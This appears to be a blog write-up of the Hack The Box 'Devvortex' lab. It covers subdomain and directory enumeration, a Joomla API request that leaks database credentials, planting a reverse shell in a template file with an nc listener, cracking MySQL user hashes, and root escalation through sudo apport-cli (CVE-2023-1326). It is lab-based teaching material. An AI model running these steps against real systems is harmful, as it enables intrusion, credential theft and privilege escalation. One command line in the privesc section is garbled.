---
author: NotCare
pubDatetime: 2023-11-27T13:00:00Z
title: HTB: Devvortex Writeup
postSlug: htb-devvortex-writeup
featured: true
draft: false
tags:
  - htb
  - writeup
  - hackthebox
  - devvortex
ogImage: ""
description: All about enumeration to information disclousure to RCE
---

# Abstract

Machine name: HTB Devvortex<br>
Level: Easy<br>
Machine OS: Linux<br>

Devvortex is a linux machine about enumerating the subdomain to find out its running joomla, then after we do light enumeration to find its information disclosure vulnerability in one of its /api/ function which leads us to joomla admin username,password. As admin we upload our reverse shell then we log in as www-data, from then on we use mysql creds to crack hashes for another user. As that user we take advantage of misconfigured and vulnerable `apport-cli` binary to privesc to root. Lets get into it!

# Table of Contents

# Kill Chain

*[Image: image]*

# Recon

We start off with nmap to look for open ports<br>

## Full port scan

Cmd:

```bash
nmap -p- 10.10.11.242 --min-rate=2000 -vvv
```

O/p:

```bash
PORT      STATE    SERVICE        REASON
22/tcp    open     ssh            syn-ack
80/tcp    open     http           syn-ack
1255/tcp  filtered de-cache-query no-response
6535/tcp  filtered unknown        no-response
23399/tcp filtered unknown        no-response
43046/tcp filtered unknown        no-response
46802/tcp filtered unknown        no-response
56464/tcp filtered unknown        no-response
56519/tcp filtered unknown        no-response
```

The other ports are for htb internal process so we'll ignore that

## Enumeration

We move on to service detection with nmap<br>
Cmd:

```bash
nmap -sC -sV -p22,80,1255,6535 10.10.11.242 -oN dev.nmap
```

O/p

```bash
PORT     STATE  SERVICE        VERSION
22/tcp   open   ssh            OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp   open   http           nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: DevVortex
```

Alright, lets visit the site and see what its about
*[Image: image]*
It's a pretty static site with not so interesting content, from here we could do `gobuster` or `subdomain` bruteforce to find out about hidden `directories & subdomains`

## Subdomain

We do subdomain bruteforce with wfuzz and we filter out response which doesnt yeild any result.
Cmd:

```bash
wfuzz -u http://devvortex.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.devvortex.htb' --hw 10
```

We find one interesting subdomain `dev.devvortex.htb`, lets add that to our host file
O/p:
*[Image: image]*

## gobuster

for good measure, lets do gobuster, but we dont find anything interesting.
cmd:

```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -t 100 -u http://devvortex.htb -oN dev.gobuster
```

o/p
*[Image: image]*

Lets work our way with the subdomain

# dev.devvortex.htb

Upon visiting the site we get
*[Image: image]*

## Robots.txt

Robots.txt reveals we're on joomla cms with other directories
*[Image: image]*

## /administrator

we get an admin page
*[Image: image]*

## joomscan

lets identify what version of joomla we're running with joomscan

```bash
joomscan  -u http://dev.devvortex.htb/
```

running joomscan we find the version to be 4.2.6

also by navigating to http://dev.devvortex.htb//administrator/manifests/files/joomla.xml
also leaks the version
*[Image: image]*

## Information Disclousure

we find this blog https://vulncheck.com/blog/joomla-for-rce talking about the mysql creds leak in api directory

```bash
curl -v http://URL/api/index.php/v1/config/application?public=true
```

o/p

```bash
{"links":{"self":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true","next":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true&pag
e%5Boffset%5D=20&page%5Blimit%5D=20","last":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true&page%5Boffset%5D=60&page%5Blimit%5D=20"},"data":({"type":"applica
tion","id":"22),"attributes":{"offline":false,"id":224}},{"type":"application","id":"224","attributes":{"offline_message":"This site is down for maintenance.<br>Please check back again soon
.","id":224}},{"type":"application","id":"224","attributes":{"display_offline_message":1,"id":224}},{"type":"application","id":"224","attributes":{"offline_image":"","id":224}},{"type":"application","id":"224","attributes":{"sitename":"Development","id":224}},{"type":"application","id":"224","attributes":{"editor":"tinymce","id":224}},{"type":"application","id":"224","attributes":{"captcha":"0","id":224}},{"type":"application","id":"224","attributes":{"list_limit":20,"id":224}},{"type":"application","id":"224","attributes":{"access":1,"id":224}},{"type":"application","id":"224","attributes":{"debug":false,"id":224}},{"type":"application","id":"224","attributes":{"debug_lang":false,"id":224}},{"type":"application","id":"224","attributes":{"debug_lang_const":true,"id":224}},{"type":"application","id":"224","attributes":{"dbtype":"mysqli","id":224}},{"type":"application","id":"224","attributes":{"host":"localhost","id":224}},{"type":"application","id":"224","attributes":{"user":"lewis","id":224}},{"type":"application","id":"224","attributes":{"password":"[REDACTED]","id":224}},{"type":"application","id":"224","attributes":{"db":"joomla","id":224}},{"type":"application","id":"224","attributes":{"dbprefix":"sd4fg_","id":224}},{"type":"application","id":"224","attributes":{"dbencryption":0,"id":224}},{"type":"application","id":"224","attributes":{"dbsslverifyservercert":false,"id":224}}],"meta":{"total-pages":4}}
```

and we find password for `lewis`

## Joomla Admin

logging in with user,pass we find the access to admin page
now lets get a revshell

## mysql config

- we come to know theres mysql running on locahost with lewis, itll help later
- by navigating to system -> global configuration -> server
  *[Image: image]*

## revshell steps

*[Image: image]*

- go to system -> site templates
- index.php wasnt writable it gave us permission error that its only readable
- we find the template name is `cassiopeia` and after pasting our payload in error.php
  *[Image: image]*
- paste your reverse shell payload
- visit `http://dev.devvortex.htb/templates/cassiopeia/error.php` after starting a listener `nc -lvnp 9001`
- we get a shell as `www-data`

# www-data

- from /etc/passwd we find `root,logan` are user accounts with bash
- from the lewis username and password we log in to myqsl

```bash
mysql -u lewis -p
```

## mysql

`show databases;` -> shows
*[Image: image]*

`use joomla`, `show tables` -> shows
_snipped output_
*[Image: image]*
`select * from sd4fg_users;` -> shows the hash

pop that hash to hashcat and after we crack it we get the password for logan

# logan

Lets ssh into logan
`ssh logan@10.10.11.2`
put in the cracked password and we get user.txt
*[Image: image]*

running `sudo -l` we find
*[Image: image]*

after looking online for that version and exploit we come across ubuntu security page
https://ubuntu.com/security/CVE-2023-1326
it talks about the exploit and also links a github page
*[Image: image]*

visiting the
https://github.com/canonical/apport/commit/e5f78cc89f1f5888b6a56b785dddcb0364c48ecb page we find
*[Image: image]*

lets cd to /var/crash to look for any crash file, at the time of writing this writup there was a crash file
*[Image: image]*

## privesc steps

- do `sudo /usr/bin/apport-cli  -c _usr_bin_sleep.1000.crash`
  *[Image: image]*
- select V (view report)
- wait for some time to see the `:`
  *[Image: image]*

- now we do `![image]//assets/htb-devvortex/bin/bash`
  *[Image: image]*
- we get root, you can find the /root/root.txt
